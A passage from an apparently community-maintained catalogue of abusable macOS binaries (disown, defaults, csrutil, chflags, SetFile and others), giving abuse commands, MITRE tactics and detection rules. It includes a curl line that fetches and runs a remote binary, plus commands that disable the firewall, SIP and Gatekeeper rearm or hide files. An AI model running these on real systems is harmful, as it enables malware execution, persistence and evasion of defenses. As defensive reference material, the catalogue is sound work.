Movement''-|-''Defense Evasion''-|-''Persistence'']","[''files''-|-''compress''-|-''recursive''-|-''files''-|-''compress''-|-''recursive''-|-''files''-|-''files'']","/usr/bin/ditto","","No detection content at time of writing","N/A","","[''ditto man page''-|-''Gatekeeper’s Achilles heel: Unearthing a macOS vulnerability''-|-''Jamf Threat Labs identifies Safari vulnerability allowing for Gatekeeper bypass'']","[''https://ss64.com/osx/ditto.html''-|-''https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/''-|-''https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/'']","","false"
"disown","Gabriel De Jesus (0xv1n)","Prevents a process from being terminated when a shell session or terminal is closed.","disown is a system utility that can be utilized to persist a shell process after a terminal has been closed or a shell session has been terminated. This is accomplished by preventing a SIGHUP from being sent to the running job, and removing the process from the shell jobs table. Unlike nohup which is used during process initialization, disown can be used to modify an existing process.","2025-05-27","","Start a process and remove it from the jobs table.","The following command downloads a remote binary, sets it to executable, executes the binary, disowns it from the shell it spawned from, and closes the terminal session.","curl -O http://1.1.1.1/updated && chmod +x updated && ./updated & disown && pkill Terminal","Persistence","bash","shell built-in command (bash)","","No detection content at time of writing","N/A","","[''disown man page''-|-''bash man page''-|-''Poseidon Stealer'']","[''https://linux.die.net/man/1/disown''-|-''https://man7.org/linux/man-pages/man1/bash.1.html''-|-''https://www.esentire.com/blog/poseidon-stealer-uses-sora-ai-lure-to-infect-macos'']","","false"
"defaults","Brendan Chamberlain (@infosecB)","Read, write, and delete user preference values.","The defaults binary is normally used to interact with the user defaults system, a database of macOS used to manage system settings much like the Windows Registry. The database can be abused by threat actors to change settings in attempt to evade defenses or to gain persistence.","2023-05-24","","[''Disable Gatekeeper's auto rearm functionality''-|-''Show mounted servers''-|-''Add a login item to the current user''-|-''Get Active Directory user info from Jamf Connect''-|-''Enable Firewall''-|-''Disable Firewall'']","[''The following command can be used to disable Gatekeepers rearm functionality. This command requires root privileges.''-|-''Show all mounted servers on the desktop.''-|-''An attacker can use defaults to add a login hook in attempt to gain persistence. This command requires root privileges.''-|-''Retrieve Active Directory user info from Jamf Connect defaults configuration.''-|-''Enables macOS' default firewall. This command requires root privileges.''-|-''Disables macOS' default firewall. This command requires root privileges.'']","[''sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO''-|-''defaults read com.apple.finder ""ShowMountedServersOnDesktop""''-|-''sudo defaults write /Library/Preferences/com.apple.loginwindow LoginHook gain_persistence.sh''-|-''defaults read com.jamf.connect.state''-|-''sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 1''-|-''sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0'']","[''Defense Evasion''-|-''Discovery''-|-''Persistence''-|-''Discovery''-|-''Defense Evasion''-|-''Defense Evasion'']","[''gatekeeper''-|-''firewall''-|-''firewall'']","/usr/bin/defaults","","No detections at time of publishing","N/A","","[''macOS defaults list: Uncomplete list of macOS defaults commands with demos''-|-''Insistence on Persistence'']","[''https://macos-defaults.com/''-|-''https://www.huntress.com/blog/insistence-on-persistence'']","","false"
"csrutil","Megan Carney (https://infosec.exchange/@PwnieFan)","Configure or view system security policies.","Used to enable/disable SIP, configure netboot and authenticated-root settings","2023-05-14","","[''Disable SIP''-|-''Disable authenticated-root''-|-''Add a netboot server''-|-''Map infrastructure''-|-''Determine if SIP is enabled'']","[''disable SIP (System Integrity Protection) - requires booting into recovery mode''-|-''When authenticated-root is disabled, booting is allowed from non-sealed system snapshots - requires booting into recovery mode''-|-''Insert a new IPv4 address in the list of allowed NetBoot sources''-|-''List allowed NetBoot sources''-|-''Determine if System Integrity Protection is enabled'']","[''csrutil disable''-|-''csrutil authenticated-root disable''-|-''csrutil netboot add <address>''-|-''csrutil netboot list''-|-''csrutil status'']","[''Defense Evasion''-|-''Defense Evasion''-|-''Defense Evasion''-|-''Reconnaissance''-|-''Discovery''-|-''Discovery'']","[''users''-|-''users''-|-''configuration''-|-''configuration'']","/usr/bin/csrutil","","[''Sigma: System Integrity Protection (SIP) Disabled''-|-''Sigma: System Integrity Protection (SIP) Enumeration'']","[''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_csrutil_disable.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_csrutil_status.yml'']","","[''Discussion on how SIP interacts with bless and netboot''-|-''MITRE ATT&CK T1518.001 Software Discovery: Security Software Discovery''-|-''The XCSSET Malware: Inserts Malicious Code Into Xcode Projects, Performs UXSSBackdoor Planting in Safari, and LeveragesTwo Zero-day Exploits'']","[''https://developer.apple.com/forums/thread/4002''-|-''https://attack.mitre.org/techniques/T1518/001/''-|-''https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf'']","","false"
"codesign","Thijs Xhaflaire","Create, manipulate and verify code signatures.","The codesign command is used to create, check, and display code signatures, as well as inquire into the dynamic status of signed code in the system.","2024-07-29","","Ad-hod codesigning an app bundle","This command forcefully re-signs the MyApp.app application with an ad-hoc signature, applying the signature deeply to all nested code within the app","codesign --force --deep -s - MyApp.app","Defense Evasion","codesign","/usr/bin/codesign","","Jamf Protect: Detect ad-hod codesigning activity","https://github.com/jamf/jamfprotect/blob/main/custom_analytic_detections/adhoc_codesigning","","[''When Apple Admits macOS Malware Is A Problem – It’s Time To Take Notice''-|-''codesign man page'']","[''https://www.sentinelone.com/blog/when-apple-admits-macos-malware-is-a-problem-its-time-to-take-notice/''-|-''https://ss64.com/mac/codesign.html'']","","false"
"chflags","demonduck","Changes file or directory flags","The chflags utility modifies the file flags of the listed files as  specified by the flags operand.","2024-07-25","","[''Hide a file''-|-''Remove hidden flag'']","[''Add the hidden flag to a file or directory to prevent it from being  visible in Finder and Terminal.''-|-''Remove the hidden flag to a file or directory to make it visible in Finder and Terminal.'']","[''chflags hidden ~/evil''-|-''chflags nohidden ~/evil'']","[''Defense Evasion''-|-''Defense Evasion'']","[''finder''-|-''finder'']","/usr/bin/chflags","","Sigma: Hidden Flag Set On File/Directory Via Chflags","https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_chflags_hidden_flag.yml","","[''chflags man page''-|-''macOS/binaries/chflags''-|-''How to hide files and folders'']","[''https://ss64.com/mac/chflags.html''-|-''https://macosbin.com/bin/chflags''-|-''https://eclecticlight.co/2024/07/03/how-to-hide-files-and-folders/'']","","false"
"caffeinate","Ethan Nay","Prevent the system from sleeping on behalf of a utility.","caffeinate creates assertions to alter system sleep behavior.  If no assertion flags are specified, caffeinate creates an assertion to prevent idle sleep. If a utility is specified, caffeinate creates the assertions on the utility's behalf, and those assertions will persist for the duration of the utility's execution. Otherwise, caffeinate creates the assertions directly, and those assertions will persist until caffeinate exits.","2023-07-12","","[''Fork a process''-|-''Prevent a sleep'']","[''Make caffeinate fork a process and hold an assertion that prevents idle sleep as long as that process is running''-|-''Prevent a macOS from going to sleep for 4 hours (14400 seconds)'']","[''caffeinate -i /tmp/evil''-|-''caffeinate -u -t 14400'']","[''Execution''-|-''Defense Evasion''-|-''Execution'']","[''bash''-|-''zsh''-|-''bash''-|-''zsh'']","/usr/bin/caffeinate","","No detections at time of publishing","N/A","","[''macOS/binaries/caffeinate''-|-''caffeinate man page'']","[''https://macosbin.com/bin/caffeinate''-|-''https://ss64.com/osx/caffeinate.html'']","","false"
"SetFile","Chris Campbell (@texasbe2trill)","Set attributes of files and directories.","Uses the CommandLine/Terminal to set file and or directory attributes. It can set attributes, creator, creation date, modification date, and file type for multiple files at a time.","2023-04-23","","[''Set a file or directory attribute to invisible''-|-''Change a file's creation and modification timestamps'']","[''A bash or zsh oneliner can allow an attacker to set the file attribute to invisible. This action can establish persistence and evade detection for malicious files on the system.''-|-''Setfile can be used with the -d and -m arguments to alter a file's creation and modification date, respectively.'']","[''for FILE in ~/*; do echo $(SetFile -a V $FILE && echo $(GetFileInfo $FILE)) >> /tmp/fileinfo.txt; sleep 2; done''-|-''SetFile -d ""04/25/2023 11:11:00"" -m ""04/25/2023 11:12:00"" targetfile.txt'']","[''Persistence''-|-''Defense Evasion''-|-''Defense Evasion'']","[''bash''-|-''zsh''-|-''oneliner''-|-''bash''-|-''zsh''-|-''oneliner'']","/usr/bin/SetFile","","No detections at time of publishing","N/A","","The Invisible Bit","https://daringfireball.net/2008/04/the_invisible_bit","","false"
"GetFileInfo","Chris Campbell (@texasbe2trill)","Get attributes of files and directories.","Uses the CommandLine/Terminal to return type, creator, attributes, created, and modified file information of a file or directory.","2023-04-23","","Iterate through a directory to GetFileInfo","A bash or zsh oneliner can provide an attacker with information about specific files of interest.","for FILE in ~/Downloads/*; do echo $(GetFileInfo $FILE) >> fileinfo.txt; sleep 2; done","Discovery","[''bash''-|-''zsh''-|-''oneliner'']","/usr/bin/GetFileInfo","","No detections at time of publishing","N/A","","macOS/binaries/GetFileInfo","https://macosbin.com/bin/getfileinfo","","false"
